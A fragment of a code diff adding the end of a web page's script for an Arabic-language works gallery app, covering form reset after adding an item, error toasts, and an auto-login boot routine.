+                        description: f_workDesc.value.trim(),
+                        visible: true,
+                        visibility: mode,
+                        visibleTo: visibleTo,
+                        ratingSum: 0,
+                        ratingCount: 0,
+                        createdAt: new Date().toISOString()
+                    });
+                    pendingImageData = null;
+                    f_workTitle.value = '';
+                    f_workDesc.value = '';
+                    adminImageInput.value = '';
+                    uploadArea.innerHTML = `<i class="fas fa-cloud-upload-alt"></i>
+                        <span>اضغط لاختيار صورة من جهازك</span>
+                        <small>JPG · PNG · WEBP — يُنصح بأقل من 1 ميجابايت</small>`;
+                    resetVisibilityPicker();
+                    showToast(mode === 'public' ? 'تمت الإضافة — يظهر للكل ✅' : `تمت الإضافة — يظهر لـ ${visibleTo.length} مستخدم ✅`);
+                } catch (e) {
+                    console.error(e);
+                    showToast('فشل الإضافة', true);
+                } finally {
+                    addImageBtn.disabled = true;
+                    addImageBtn.innerHTML = old;
+                }
+            });
+
+            // ============================================================
+            // BOOT
+            // ============================================================
+            (function boot() {
+                if (!autoLogin()) {
+                    showView('viewLogin');
+                }
+                renderWorksGrid();
+            })();
+
+            console.log('🚀 النظام جاهز — Firebase + Login + Works + Users + Visibility + Encrypted Admin');
+        })();
+    </script>
+
+</body>
+</html>
